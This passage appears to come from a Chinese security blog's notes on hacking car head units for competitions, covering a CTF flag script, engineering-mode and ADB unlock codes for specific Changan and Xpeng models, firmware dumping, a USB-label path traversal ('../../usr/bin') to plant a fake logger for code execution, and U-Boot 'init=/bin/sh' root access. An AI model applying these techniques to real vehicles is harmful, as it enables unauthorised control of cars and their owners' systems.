class="number">3</span></span><br><span class="line">a1[<span class="number">17</span>] -= <span class="number">5</span></span><br><span class="line">a1[<span class="number">33</span>] -= <span class="number">55</span></span><br><span class="line">a1[<span class="number">35</span>] -= <span class="number">56</span></span><br><span class="line">a1[<span class="number">10</span>] -= <span class="number">2</span></span><br><span class="line">a1[<span class="number">26</span>] -= <span class="number">67</span></span><br><span class="line">a1[<span class="number">21</span>] -= <span class="number">6</span></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a1:</span><br><span class="line">    flag += <span class="built_in">chr</span>(i)</span><br><span class="line">flag += <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></div></figure>



<p>使用<code>ghidra</code>也可以加载<code>File-&gt;import File</code>，设置<code>language</code>为<code>armv6</code>小端序</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230913153250226.png" alt="image-20230913153250226"></p>
<p>随后<code>options</code>打开，设置一下基地址即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230913154044197.png" alt="image-20230913154044197"></p>
<p>也从最开始的函数分析即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230913154307880.png" alt="image-20230913154307880"></p>
<p>找到<code>flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230913154327708.png" alt="image-20230913154327708"></p>
<p>一样解析一下即可。</p>

        <h1 id="车联网比赛准备"   >
          <a href="#车联网比赛准备" class="heading-link"><i class="fas fa-link"></i></a><a href="#车联网比赛准备" class="headerlink" title="车联网比赛准备"></a>车联网比赛准备</h1>
      <p>站在主办方的角度准备车型、品牌，比如比赛在重庆举办，那么使用长安汽车的概率久比较高。</p>

        <h2 id="常见漏洞点"   >
          <a href="#常见漏洞点" class="heading-link"><i class="fas fa-link"></i></a><a href="#常见漏洞点" class="headerlink" title="常见漏洞点"></a>常见漏洞点</h2>
      
        <h3 id="1-工程模式"   >
          <a href="#1-工程模式" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-工程模式" class="headerlink" title="1.工程模式"></a>1.工程模式</h3>
      
        <h3 id="2-流量分析"   >
          <a href="#2-流量分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-流量分析" class="headerlink" title="2.流量分析"></a>2.流量分析</h3>
      <p>与车机组网，向上分析TSP平台的漏洞，常见的WEB漏洞；向下分析车机端的漏洞，比如任意软件安装</p>
<p>如果DNS(53)端口开放，那么热点极有可能是TBOX发出的。</p>

        <h3 id="3-系统漏洞挖掘"   >
          <a href="#3-系统漏洞挖掘" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-系统漏洞挖掘" class="headerlink" title="3.系统漏洞挖掘"></a>3.系统漏洞挖掘</h3>
      <p>拿到车机权限后就是进一步漏洞挖掘了</p>

        <h3 id="4-调试接口"   >
          <a href="#4-调试接口" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-调试接口" class="headerlink" title="4.调试接口"></a>4.调试接口</h3>
      <p>通过逻辑分析仪和示波器等，可以判断调试串口的<code>Tx</code>接口、波特率等。</p>

        <h2 id="常见风险点"   >
          <a href="#常见风险点" class="heading-link"><i class="fas fa-link"></i></a><a href="#常见风险点" class="headerlink" title="常见风险点"></a>常见风险点</h2>
      <p>进入系统，一般查找如下几个点</p>
<ul>
<li>运行了哪些进程</li>
<li>开启了哪些端口</li>
<li>有没有厂家开发人员留下的调试手段/后门等</li>
<li>和哪些云端主机进行通讯</li>
<li>应用商店使用抓包：<ul>
<li>中间人替换应用包</li>
<li>应用商店<code>FTP</code>获取用户名密码，登录篡改<code>apk</code>包</li>
</ul>
</li>
<li>APP使用抓包</li>
</ul>

        <h1 id="车机TIPs"   >
          <a href="#车机TIPs" class="heading-link"><i class="fas fa-link"></i></a><a href="#车机TIPs" class="headerlink" title="车机TIPs"></a>车机TIPs</h1>
      
        <h2 id="工程模式"   >
          <a href="#工程模式" class="heading-link"><i class="fas fa-link"></i></a><a href="#工程模式" class="headerlink" title="工程模式"></a>工程模式</h2>
      <p>有很多的特殊的进入方法，比如拨号盘输入密码，长按系统版本版本号，时间等，逆向固件获取工程模式密码，咸鱼/淘宝搜索车型固件，社工</p>

        <h3 id="长安"   >
          <a href="#长安" class="heading-link"><i class="fas fa-link"></i></a><a href="#长安" class="headerlink" title="长安"></a>长安</h3>
      <p>部分车型在拨号盘输入<code>*#201301#*</code>进入工程模式，输入<code>*#518299#*</code>进入<code>Android</code>原生界面</p>

        <h2 id="ADB开启"   >
          <a href="#ADB开启" class="heading-link"><i class="fas fa-link"></i></a><a href="#ADB开启" class="headerlink" title="ADB开启"></a>ADB开启</h2>
      
        <h3 id="小鹏"   >
          <a href="#小鹏" class="heading-link"><i class="fas fa-link"></i></a><a href="#小鹏" class="headerlink" title="小鹏"></a>小鹏</h3>
      <p>小鹏P5 (OTA3.50及之前)或小鹏G9 (OTA4.3.1及之前)或小鹏G6(末测试)或小鹏P7(OTA2.10及之前)或小鹏G3 (版本不确定，最新版不行)</p>
<p>电脑和车机组网</p>
<p>打开车机的拨号界面，输入 <code>*#9925*111#*</code></p>
<p>此时车机会显示一个页面，其中包含一个二维码</p>
<p>使用微信扫描车机的二维码，并将内容保存备用</p>
<p>在任意输入框中输入内容 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hackxpeng.bgcpdd.eu.org/xpeng?m=hackxpeng&amp;id=" >https://hackxpeng.bgcpdd.eu.org/xpeng?m=hackxpeng&amp;id=</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> ，然后将获取到的二维码内容复制到最后面，注意此处不要有任何的空格</p>
<p>使用浏览器打开输入框中的所有内容 (网址拼接，如: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hackxpeng.bgcpdd.eu.org/xpeng?m=hackxpeng&amp;id-XPENGD55xXXXXXxxxxxxxx" >https://hackxpeng.bgcpdd.eu.org/xpeng?m=hackxpeng&amp;id-XPENGD55xXXXXXxxxxxxxx</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>浏览器返回一个解锁码，如<code>*#03*12345678*#</code></p>
<p>将该解锁码输入车机的拨号界面，此时解锁码会自动消失，如果没有消失请手动删除所有内容</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230915094134303.png" alt="image-20230915094134303"></p>

        <h2 id="固件获取"   >
          <a href="#固件获取" class="heading-link"><i class="fas fa-link"></i></a><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h2>
      <p>获取固件的方法有很多，除了提取之外还能从论坛、官网下载等</p>
<ul>
<li><p>官网下载：车企官网可能可以下载车机升级包</p>
</li>
<li><p>分析流量获取下载地址：可以抓取车机升级包的流量，如果通过明文传输可以获取到下载地址</p>
</li>
<li><p>从Flash提取：编程器提取芯片</p>
</li>
<li><p>通过调试接口提取：车机上的系统，通常来说可以通过调试接口获取到对应的固件</p>
</li>
<li><p>从系统导出：这个就需要拿到shell权限进行导出了，常见命令为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/mtd0 of=/tmp/SD0/mtd0.bin</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h2 id="固件分析"   >
          <a href="#固件分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h2>
      <p>常见的固件功能清单如下</p>
<div class="table-container"><table>
<thead>
<tr>
<th>名称</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>container.iso.bin</td>
<td>ISO光盘文件，包含bootloader、资源文件等</td>
</tr>
<tr>
<td>content.md5</td>
<td>保存其他文件的MD5值</td>
</tr>
<tr>
<td>custver.reg.bin</td>
<td>注册表文件，记录软件版本信息</td>
</tr>
<tr>
<td>force.dnl</td>
<td>配置文件</td>
</tr>
<tr>
<td>initramfs.bin</td>
<td>内核文件</td>
</tr>
<tr>
<td>1x001.tar.gz</td>
<td>压缩的根文件系统</td>
</tr>
<tr>
<td>manifest.ini</td>
<td>配置文件，记录固件的版本号、创建日期等</td>
</tr>
<tr>
<td>manifest.mnf</td>
<td>manifest文件</td>
</tr>
<tr>
<td>manifest.smd</td>
<td>其他文件的签名信息，用于验证数据是否被篡改</td>
</tr>
<tr>
<td>reg_eur.tar.gz</td>
<td>压缩的资源文件</td>
</tr>
<tr>
<td>reg_gom.tar.gz.bins</td>
<td>压缩的资源文件</td>
</tr>
<tr>
<td>reg_nar.tar.gz</td>
<td>压缩的资源文件</td>
</tr>
<tr>
<td>SpecialLogDirX</td>
<td>日志文件</td>
</tr>
<tr>
<td>triton_mid.bin</td>
<td>u-boot legacy uImage文件</td>
</tr>
<tr>
<td>uimage.bin</td>
<td>内核文件</td>
</tr>
<tr>
<td>version.info</td>
<td>版本信息</td>
</tr>
</tbody></table></div>

        <h3 id="USB目录穿越"   >
          <a href="#USB目录穿越" class="heading-link"><i class="fas fa-link"></i></a><a href="#USB目录穿越" class="headerlink" title="USB目录穿越"></a>USB目录穿越</h3>
      <p>针对<code>1x001.tar.gz</code>是车机的根文件系统，在文件系统中找到<code>USB</code>挂载程序，存在路径穿越漏洞，在<code>udev</code>的配置程序<code>/etc/udev/scripts/mount.sh</code>中，<code>automount()</code>函数用于挂载<code>USB</code>设备</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">automount()</span><br><span class="line">	<span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$&#123;ID_FS_TYPE&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">	logger -p user.err <span class="string">&quot;mount.sh/automount&quot;</span> <span class="string">&quot;<span class="variable">$DEVNAME</span> has no filesystem, not mounting&quot;</span></span><br><span class="line">		<span class="built_in">return</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">	<span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$&#123;ID_FS_UUID&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">		mountdir = <span class="variable">$&#123;ID_FS_UUID&#125;</span></span><br><span class="line">	<span class="keyword">elif</span> [-n <span class="string">&quot;<span class="variable">$&#123;ID_FS_LABEL&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">		mountdir = <span class="variable">$&#123;ID_FS_LABEL&#125;</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		mountdir = <span class="string">&quot;disk&quot;</span></span><br><span class="line">		<span class="keyword">while</span> [ -d <span class="variable">$MOUNTPT</span>/<span class="variable">$mountdir</span> ]; <span class="keyword">do</span></span><br><span class="line">			mountdir = <span class="string">&quot;<span class="variable">$&#123;mountdir&#125;</span>_&quot;</span></span><br><span class="line">		<span class="keyword">done</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line">	result = $(<span class="variable">$MOUNT</span> -t <span class="variable">$&#123;ID_FS_TYPE&#125;</span> -o sync,ro<span class="variable">$IOCHARSET</span> <span class="variable">$DEVNAME</span> <span class="string">&quot;<span class="variable">$MOUNTPT</span>/<span class="variable">$mountdir</span>&quot;</span> 2&gt;&amp;1)</span><br></pre></td></tr></table></div></figure>

<p>上述程序逻辑如下</p>
<ul>
<li>通过<code>ID_FS_TYPE</code>识别U盘文件系统的格式，如果识别成功则继续，否则退出</li>
<li>继续则识别U盘的<code>ID_FS_UUID</code>和<code>ID_FS_LABEL</code>，用于构造最终的挂载点，U盘挂载的地址由<code>MOUNTPT</code>和<code>mountdir</code>进行拼接而成，<code>MOUNTPT</code>为固定值<code>/dev/media</code>，<code>mountdir</code>为一个变量，依据<code>U</code>盘中对于<code>ID_FS_UUID</code>和<code>ID_FS_LABEL</code>进行赋值确定</li>
<li>如果<code>ID_FS_UUID</code>不为空，则<code>mountdir</code>的值为<code>ID_FS_UUID</code>，如果为空，则判断<code>ID_FS_LABEL</code>是否为空，不为空则<code>mountdir</code>的值赋值为<code>ID_FS_LABEL</code>，若都为空，则将<code>mountdir</code>赋值为<code>disk</code></li>
<li>上述代码最终会将<code>U</code>盘挂载到<code>/dev/media/$mountdir</code>上，那么如果<code>$mountdir</code>可控，就可以通过<code>../</code>进行目录穿越，将之挂载到任意地方，比如<code>/usr/bin/</code>中</li>
<li>而<code>$mountdir</code>是可以通过<code>ID_FS_UUID</code>和<code>ID_FS_LABEL</code>来确定，而<code>ID_FS_UUID</code>和<code>ID_FS_LABEL</code>可以使用工具对<code>U</code>盘对应值进行修改，这样就可以通过<code>ID_FS_UUID</code>和<code>ID_FS_LABEL</code>来控制<code>$mountdir</code>从而制造目录穿越。</li>
</ul>
<p>使用<code>blkid</code>、<code>tune2fs</code>和<code>e2label</code>命令来对<code>U</code>盘进行对应值修改，命令如下</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">blkid /dev/sdb1      <span class="comment">#查看UUID</span></span><br><span class="line">e2label /dev/sdb1 	<span class="comment">#查看LABEL</span></span><br><span class="line"></span><br><span class="line">umount /dev/sdb1</span><br><span class="line">tune2fs -U NULL /dev/sdb1   <span class="comment">#置空UUID</span></span><br><span class="line"></span><br><span class="line">e2label /dev/sdb1 <span class="string">&quot;../../usr/bin&quot;</span>   <span class="comment">#将LABEL置为&quot;../../usr/bin&quot;</span></span><br></pre></td></tr></table></div></figure>

<p>随后继续看<code>mount.sh</code>，有如下代码</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [<span class="variable">$&#123;status&#125;</span> -ne 0];<span class="keyword">then</span></span><br><span class="line">logger -p user.err <span class="string">&quot;mount.sh/automount&quot;</span> <span class="string">&quot;<span class="variable">$MOUNT</span> -t <span class="variable">$&#123;ID_FS_TYPE&#125;</span> -o sync,ro <span class="variable">$DEVNAME</span> \&quot;<span class="variable">$MOUNTPT</span>/<span class="variable">$mountdir</span>\&quot; failed: <span class="variable">$&#123;result&#125;</span>&quot;</span></span><br><span class="line">rm_dir <span class="string">&quot;<span class="variable">$MOUNTPT</span>/<span class="variable">$mountdir</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">logger <span class="string">&quot;mount.sh/automount&quot;</span> <span class="string">&quot;mount [<span class="variable">$MOUNTPT</span>/<span class="variable">$mountdir</span>] with type <span class="variable">$&#123;ID_FS_TYPE&#125;</span> successful&quot;</span></span><br><span class="line">mkdir -p &#123;MOUNTDB&#125;</span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$MOUNTPT</span>/<span class="variable">$mountdir</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$&#123;MOUNTDB&#125;</span>/<span class="variable">$devname</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></div></figure>

<p>命令<code>logger</code>位于<code>/usr/logger</code>目录下，可以将<code>LABEL</code>置为<code>../../usr/bin/</code>从而将<code>U</code>盘中的同名命令<code>logger</code>放入到<code>/usr/bin/</code>中，那么在<code>mount.sh</code>调用到<code>logger</code>时，就会调用到<code>U</code>盘中的<code>logger</code>，那么即可执行任意命令，也就是说通过插拔<code>U</code>盘即可执行命令，不用进入到车机中，那么这时可以通过组网进行反弹<code>shell</code>到电脑中。</p>

        <h3 id="符号表恢复"   >
          <a href="#符号表恢复" class="heading-link"><i class="fas fa-link"></i></a><a href="#符号表恢复" class="headerlink" title="符号表恢复"></a>符号表恢复</h3>
      
        <h2 id="系统启动"   >
          <a href="#系统启动" class="heading-link"><i class="fas fa-link"></i></a><a href="#系统启动" class="headerlink" title="系统启动"></a>系统启动</h2>
      <p>如果在调试串口的系统启动过程有<code>Hit any key to stop autoboot: 0</code>，那么代表在启动时时可以输入任意值进入<code>U-Boot</code>的。</p>
<p>进入之后可以通过输入<code>help</code>可以查看命令帮助，一般会有<code>printenv</code>、<code>setenv</code>、<code>saveenv</code>等设置环境变量的命令，可以通过这些命令进入单用户模式重置<code>root</code>用户的密码</p>
<p>比如<code>bootargs</code>环境变量如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console = $&#123;console&#125;,115200n8n mem=$&#123;linuxmem&#125; maxcpus=$&#123;cores&#125; root=/dev/$&#123;rootdev&#125; rootwait lpj=1994752 panic=$&#123;panic&#125; panic=$&#123;panic&#125; panic_on_oops=$&#123;panic_on_oops&#125; usbcore.rh_oc_handle=1 $&#123;xtargs&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以使用设置环境变量的命令在最后添加<code>init=/bin/sh</code></p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setenv bootargs console = <span class="variable">$&#123;console&#125;</span>,115200n8n mem=<span class="variable">$&#123;linuxmem&#125;</span> maxcpus=<span class="variable">$&#123;cores&#125;</span> root=/dev/<span class="variable">$&#123;rootdev&#125;</span> rootwait lpj=1994752 panic=<span class="variable">$&#123;panic&#125;</span> panic=<span class="variable">$&#123;panic&#125;</span> panic_on_oops=<span class="variable">$&#123;panic_on_oops&#125;</span> usbcore.rh_oc_handle=1 init=/bin/sh</span><br><span class="line">saveenv</span><br><span class="line">reset</span><br></pre></td></tr></table></div></figure>

<p>车机重启后，就能直接进入单用户模式，获得<code>root</code>的<code>shell</code>，此时就可以重置一些密码，添加一些后门等。</p>

        <h1 id="测试工具-2"   >
          <a href="#测试工具-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#测试工具-2" class="headerlink" title="测试工具"></a>测试工具</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.fischl.de/usbtin/" >USBtin - USB to CAN interface - fischl.de</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="CANToolz"   >
          <a href="#CANToolz" class="heading-link"><i class="fas fa-link"></i></a><a href="#CANToolz" class="headerlink" title="CANToolz"></a>CANToolz</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/CANToolz/CANToolz" >GitHub - CANToolz/CANToolz: CANToolz - Black-box CAN network analysis framework</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>进行<code>CAN</code>模糊的</p>

        <h2 id="USBtinViewer"   >
          <a href="#USBtinViewer" class="heading-link"><i class="fas fa-link"></i></a><a href="#USBtinViewer" class="headerlink" title="USBtinViewer"></a>USBtinViewer</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.fischl.de/usbtin/#usbtinviewer" >USBtin - USB to CAN interface - fischl.de</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/EmbedME/USBtinViewer" >GitHub - EmbedME/USBtinViewer: Simple GUI for USBtin (USB to CAN interface)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>进行<code>USB</code>的<code>CAN</code>协议探测</p>

        <h1 id="测试方法"   >
          <a href="#测试方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h1>
      
        <h2 id="故障注入"   >
          <a href="#故障注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#故障注入" class="headerlink" title="故障注入"></a>故障注入</h2>
      <p>电压故障注入：《敲开内存保护的最后一扇门》付鹏飞</p>
<p>电磁故障注入：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/newaetech/chipshouter-picoemp" >GitHub - newaetech/chipshouter-picoemp: Why not run micropython on your EMFI tool?</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="附录"   >
          <a href="#附录" class="heading-link"><i class="fas fa-link"></i></a><a href="#附录" class="headerlink" title="附录"></a>附录</h1>
      
        <h2 id="ISO-14229-1-2020例程RID标准"   >
          <a href="#ISO-14229-1-2020例程RID标准" class="heading-link"><i class="fas fa-link"></i></a><a href="#ISO-14229-1-2020例程RID标准" class="headerlink" title="ISO 14229-1-2020例程RID标准"></a>ISO 14229-1-2020例程RID标准</h2>
      <div class="table-container"><table>
<thead>
<tr>
<th align="center">RID Byte Value</th>
<th>RID Name</th>
<th>RID Description</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0x0000 – 0x00FF</td>
<td>ISO/SAE Reserved</td>
<td>This value shall be reserved by this document for future  definition</td>
</tr>
<tr>
<td align="center">0x0100 – 0x01FF</td>
<td>Tachograph Test Ids</td>
<td>This range of values is reserved to represent Tachograph test  result values.</td>
</tr>
<tr>
<td align="center">0x0200 – 0xDFFF</td>
<td>Vehicle Manufacturer Specific</td>
<td>This range of values is reserved for vehicle manufacturer specific  use.</td>
</tr>
<tr>
<td align="center">0xE000 – 0xE1FF</td>
<td>OBD Protocol Test Ids</td>
<td>This range of values is reserved to represent OBD/EOBD test  result values</td>
</tr>
<tr>
<td align="center">0xE200</td>
<td>Execute SPL</td>
<td>This value shall be used to convert a program module to an  executable form.</td>
</tr>
<tr>
<td align="center">0xE201</td>
<td>Deploy Loop Routine ID</td>
<td>This value shall be used to initiate the deployment of the  previously selected ignition loop.</td>
</tr>
<tr>
<td align="center">0xE202 – 0xE2FF</td>
<td>Safety System Routine IDs</td>
<td>This range of values shall be reserved by this document for future  definition of routines implemented by safety related systems.</td>
</tr>
<tr>
<td align="center">0xE300 – 0xEFFF</td>
<td>ISO/SAE Reserved</td>
<td>This value shall be reserved by this document for future  definition.</td>
</tr>
<tr>
<td align="center">0xF000 – 0xFEFF</td>
<td>System Supplier Specific</td>
<td>This range of values is reserved for system supplier specific use.</td>
</tr>
<tr>
<td align="center">0xFF00</td>
<td>Erase Memory</td>
<td>This value shall be used to start the server’s memory erase  routine. The Control option and status record format shall be ECU  specific and defined by the vehicle manufacturer.</td>
</tr>
<tr>
<td align="center">0xFF01</td>
<td>Check Programming Dependencies</td>
<td>This value shall be used to check the server’s memory  programming dependencies. The Control option and status record  format shall be ECU specific and defined by the vehicle  manufacturer.</td>
</tr>
<tr>
<td align="center">0xFF02 – 0xFFFF</td>
<td>ISO/SAE Reserved</td>
<td>This value shall be reserved by this document for future  definition.NOTE FF0216 was formerly used for eraseMirrorMemoryDTCs.</td>
</tr>
</tbody></table></div>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/8UeirFvQI4G0YUh6GKI4Sg" >国产智能网联汽车漏洞挖掘中的几个突破点 (qq.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>还有很多，在文章中有参考的应该都有标注</p>

        <h2 id="NRC错误码"   >
          <a href="#NRC错误码" class="heading-link"><i class="fas fa-link"></i></a><a href="#NRC错误码" class="headerlink" title="NRC错误码"></a>NRC错误码</h2>
      <p>Hex    Name    Description<br>01    ISOSAEReserved    ISO 保留，暂时未定义<br>…<br>0F<br>10    GeneralReject    一般性拒绝。通常在无法准确描述错误时发出<br>11    serviceNotSupported    服务不支持。多出现在服务未被定义<br>12    sub-functionNotSupported    子功能不支持。多出现子功能未被定义<br>13    ncorrectMessageLengthOrInvalidFormat    报文长度错误<br>14    responseTooLong    响应字节数太长<br>15    ISOSAEReserved    ISO 保留，暂时未定义<br>…<br>20<br>21    busyRepeatRequest    过忙导致执行失败。多出现在快速发送请求<br>22    conditionsNotCorrect    条件不满足。多出现在整车状态无法满足诊断的需求<br>23    ISOSAEReserved    ISO 保留，暂时未定义<br>24    requestSequenceError    请求的顺序错误。多出现在没有首先接收请求的情况下接收sendKey子功能<br>25    noResponseFromSubnetComponent    子网无法响应<br>26    FailurePreventsExecutionOfRequestedAction    DTC出现了错误的记录。一般不出现<br>27    ISOSAEReserved    ISO 保留，暂时未定义<br>…<br>30<br>31    requestOutOfRange    请求超出范围<br>32    ISOSAEReserved    ISO 保留，暂时未定义<br>33    securityAccessDenied    安全访问模式错误<br>34    ISOSAEReserved    ISO 保留，暂时未定义<br>35    invalidKey    密钥key无效<br>36    exceededNumberOfAttempts    收到的invalidKey超过了允许的尝试次数<br>37    requiredTimeDelayNotExpired    NRC_36之后，安全访问锁定的时间内再次请求seed<br>38    reservedByExtendedDataLinkSecurityDocument    扩展数据链路层保留<br>…<br>4F<br>50    ISOSAEReserved    ISO 保留，暂时未定义<br>…<br>6F<br>70    uploadDownloadNotAccepted    上传/下载受限。多出现在通过诊断刷写程序<br>71    transferDataSuspended    数据传输中断。多出现在通过诊断刷写程序<br>72    generalProgrammingFailure    编程失败。多出现在通过诊断刷写程序<br>73    wrongBlockSequenceCounter    块序计算错误。多出现在通过诊断刷写程序<br>74    ISOSAEReserved    ISO 保留，暂时未定义<br>…<br>77<br>78    requestCorrectlyReceived-ResponsePending    请求正常接收，但应答正在响应中<br>79    ISOSAEReserved    ISO 保留，暂时未定义<br>…<br>7D<br>7E    sub-functionNotSupportedInActiveSession    该子功能在当前会话下不支持<br>7F    serviceNotSupportedInActiveSession    该服务在当前会话下不支持<br>80    ISOSAEReserved    ISO 保留，暂时未定义<br>81    rpmTooHigh    编程管理地址过高<br>82    rpmTooLow    编程管理地址过低<br>83    engineIsRunning    发动机运转。·<br>84    engineIsNotRunning    发动机未运转<br>85    engineRunTimeTooLow    发动机运行时间过短<br>86    temperatureTooHigh    温度过高<br>87    temperatureTooLow    温度过低<br>88    vehicleSpeedTooHigh    车速过高<br>89    vehicleSpeedTooLow    车速过低<br>8A    throttle/PedalTooHigh    油门/踏板太高<br>8B    throttle/PedalTooLow    油门/踏板太低<br>8C    transmissionRangeNotInNeutral    非空挡<br>8D    transmissionRangeNotInGear    不在指定档位<br>8E    ISOSAEReserved    ISO 保留，暂时未定义<br>8F    brakeSwitch(es)NotClosed    踏板开关未关闭<br>90    shifterLeverNotInPark    车辆处于非P档<br>91    torqueConverterClutchLocked    液力变矩器离合器锁定<br>92    voltageTooHigh    电压过高<br>93    voltageTooLow    电压过低<br>94    reservedForSpecificConditionsNotCorrect    预留给特定异常情况<br>…<br>EF<br>F0    vehicleManufacturerSpecificConditionsNotCorrect    预留给整车厂定义的特定异常情况<br>…<br>FE<br>FF    ISOSAEReserved    ISO 保留，暂时未被定义<br>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42957717/article/details/116915901" >跟我学UDS(ISO14229) ———— NRC码_nrc uds-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="硬件安全"   >
          <a href="#硬件安全" class="heading-link"><i class="fas fa-link"></i></a><a href="#硬件安全" class="headerlink" title="硬件安全"></a>硬件安全</h1>
      
        <h2 id="1-芯片PCB丝印"   >
          <a href="#1-芯片PCB丝印" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-芯片PCB丝印" class="headerlink" title="1.芯片PCB丝印"></a>1.芯片PCB丝印</h2>
      <p>通过Datasheet，google等搜索芯片的PCB丝印信息</p>

        <h2 id="2-引脚探测"   >
          <a href="#2-引脚探测" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-引脚探测" class="headerlink" title="2.引脚探测"></a>2.引脚探测</h2>
      <p>使用JTAGulator可以连接各个接口，地线，然后通过串口连接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231212110209305.png" alt="image-20231212110209305"></p>
<p>分析Jtag接口</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231212110223873.png" alt="image-20231212110223873"></p>
<p>其他的也是类似的，help查看命令即可。</p>

        <h2 id="3-固件提取读写"   >
          <a href="#3-固件提取读写" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-固件提取读写" class="headerlink" title="3.固件提取读写"></a>3.固件提取读写</h2>
      
        <h3 id="提取"   >
          <a href="#提取" class="heading-link"><i class="fas fa-link"></i></a><a href="#提取" class="headerlink" title="提取"></a>提取</h3>
      <p>拆解芯片之后，使用RT809H编程器打开进行芯片识别，然后提取即可。</p>

        <h3 id="读写"   >
          <a href="#读写" class="heading-link"><i class="fas fa-link"></i></a><a href="#读写" class="headerlink" title="读写"></a>读写</h3>
      <p>通过飞线连接对应的Jtag或者SWD接口等，然后用JFlash进行连接即可读取刷写</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231212110555867.png" alt="image-20231212110555867"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231212110612357.png" alt="image-20231212110612357"></p>
